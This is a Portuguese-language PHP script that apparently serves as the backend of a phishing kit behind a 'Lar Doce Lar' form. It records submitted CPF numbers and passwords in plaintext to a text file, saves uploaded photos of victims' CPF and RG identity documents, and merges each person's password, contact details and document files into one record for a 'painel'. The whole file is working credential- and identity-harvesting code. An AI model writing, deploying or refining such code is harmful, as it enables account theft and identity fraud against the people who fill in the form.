<?php
// Ativa a exibição de erros para depuração
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Define o fuso horário para que o horário dos registros fique correto
date_default_timezone_set('America/Sao_Paulo');

// Garante que a requisição seja do tipo POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $nomeArquivoLog = 'registros_acesso.txt';
    $dataHora = date('d/m/Y H:i:s');

    // =========================================================================
    // CASO 1: Salvamento do Login Inicial (CPF e Senha)
    // =========================================================================
    if (isset($_POST['cpf']) && isset($_POST['senha']) && !isset($_POST['nome'])) {
        $cpf = trim($_POST['cpf']);
        $senha = trim($_POST['senha']);

        if (!empty($cpf) && !empty($senha)) {
            $linha = "Data/Hora: $dataHora | CPF: $cpf | Senha: $senha" . PHP_EOL;
            file_put_contents($nomeArquivoLog, $linha, FILE_APPEND | LOCK_EX);
            
            http_response_code(200);
            echo "Dados de acesso gravados.";
        } else {
            http_response_code(400);
            echo "Erro: Dados incompletos.";
        }
        exit;
    }

    // =========================================================================
    // CASO 2: Salvamento do Formulário Lar Doce Lar (Etapas 1 e 2)
    // =========================================================================
    $nome     = isset($_POST['nome']) ? trim($_POST['nome']) : 'Não informado';
    $telefone = isset($_POST['telefone']) ? trim($_POST['telefone']) : 'Não informado';
    $email    = isset($_POST['email']) ? trim($_POST['email']) : 'Não informado';
    $cpfRef   = isset($_POST['cpf_referencia']) ? trim($_POST['cpf_referencia']) : 'Não informado';

    // Processamento de Uploads de Documentos (Etapa 2)
    $pastaUpload = 'arquivos/';
    if (!file_exists($pastaUpload)) {
        mkdir($pastaUpload, 0775, true);
    }

    function processarUpload($campoFormulario, $prefixoNome, $pasta) {
        // Remove os colchetes caso o input venha como array (ex: cpf_frente[])
        $campoLimpo = str_replace('[]', '', $campoFormulario);

        if (isset($_FILES[$campoLimpo])) {
            $fileData = $_FILES[$campoLimpo];
            
            $erro = is_array($fileData['error']) ? $fileData['error'][0] : $fileData['error'];
            
            if ($erro === UPLOAD_ERR_OK) {
                $nomeOriginal = is_array($fileData['name']) ? $fileData['name'][0] : $fileData['name'];
                $extensao = strtolower(pathinfo($nomeOriginal, PATHINFO_EXTENSION));
                
                $extensoesPermitidas = ['jpg', 'jpeg', 'png', 'pdf'];
                if (in_array($extensao, $extensoesPermitidas)) {
                    $novoNome = $prefixoNome . "_" . uniqid() . "." . $extensao;
                    $caminhoDestino = $pasta . $novoNome;
                    
                    $tmpName = is_array($fileData['tmp_name']) ? $fileData['tmp_name'][0] : $fileData['tmp_name'];
                    
                    if (move_uploaded_file($tmpName, $caminhoDestino)) {
                        return $novoNome;
                    }
                }
            }
        }
        return "Nenhum arquivo enviado";
    }

    // Processa os 4 arquivos considerando o formato com ou sem colchetes do HTML
    $arqCpfFrente = processarUpload('cpf_frente', 'cpf_frente', $pastaUpload);
    $arqCpfVerso  = processarUpload('cpf_verso', 'cpf_verso', $pastaUpload);
    $arqIdFrente  = processarUpload('identidade_frente', 'rg_frente', $pastaUpload);
    $arqIdVerso   = processarUpload('identidade_verso', 'rg_verso', $pastaUpload);

    // =========================================================================
    // BUSCA A SENHA, LIMPA O REGISTRO PENDENTE ANTERIOR E EVITA DUPLICAÇÃO
    // =========================================================================
    $senhaEncontrada = "-";
    $linhasNovas = [];
    
    if (file_exists($nomeArquivoLog)) {
        $linhasLog = file($nomeArquivoLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($linhasLog as $linhaAntiga) {
            // Se encontrar uma linha antiga para o mesmo CPF
            if (strpos($linhaAntiga, "CPF: $cpfRef") !== false) {
                // Tenta capturar a senha que estava salva nela
                if (strpos($linhaAntiga, "Senha: ") !== false) {
                    preg_match('/Senha: ([^\|]+)/', $linhaAntiga, $matches);
                    if (isset($matches[1]) && trim($matches[1]) !== '-') {
                        $senhaEncontrada = trim($matches[1]);
                    }
                }
                // Pula a linha antiga para apagá-la do arquivo e não duplicar no painel
                continue; 
            }
            // Mantém intactos os registros de outros CPFs
            $linhasNovas[] = $linhaAntiga;
        }
        // Atualiza o arquivo de texto removendo o rascunho/pendente antigo deste CPF
        file_put_contents($nomeArquivoLog, implode(PHP_EOL, $linhasNovas) . (empty($linhasNovas) ? '' : PHP_EOL));
    }

    // Monta a linha completa e unificada para o painel ler perfeitamente
    $novaLinha = "Data/Hora: $dataHora | CPF: $cpfRef | Senha: $senhaEncontrada | Nome: $nome | Tel: $telefone | Email: $email | [CPF_F] $arqCpfFrente | [CPF_V] $arqCpfVerso | [RG_F] $arqIdFrente | [RG_V] $arqIdVerso" . PHP_EOL;

    // Grava o registro final consolidado no arquivo
    file_put_contents($nomeArquivoLog, $novaLinha, FILE_APPEND | LOCK_EX);

    http_response_code(200);
    echo "Dados gravados com sucesso.";

} else {
    http_response_code(405);
    echo "Método não permitido.";
}
?>